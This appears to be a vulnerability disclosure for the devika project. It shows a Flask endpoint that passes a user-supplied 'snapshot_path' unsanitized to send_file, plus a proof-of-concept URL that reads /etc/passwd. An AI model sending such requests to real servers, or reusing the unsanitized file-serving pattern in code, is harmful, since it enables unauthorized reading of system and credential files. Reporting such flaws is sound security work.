# Description
`devika`'s `@app.route("/api/get-browser-snapshot", methods=["GET"])` allowed the server to retrieve `browser-snapshot` from saved path. Nevertheless, due to the lack of sanitization, Arbitrary Local File can be leaked via this endpoint.

 # Proof of Concept

In endpoint `./devika/devika.py`

```python
@app.route("/api/get-browser-snapshot", methods=["GET"])
@route_logger(logger)
def browser_snapshot():
    snapshot_path = request.args.get("snapshot_path")
    return send_file(snapshot_path, as_attachment=True)
```

Attacker can retrieve arbitrary file by directly passing `snapshot_path` as a parameter

## Exploiting

via 

```
http://192.168.31.26:1337/api/get-browser-snapshot?snapshot_path=/etc/passwd
```

![image-20240412114120773](https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202404121141801.png)
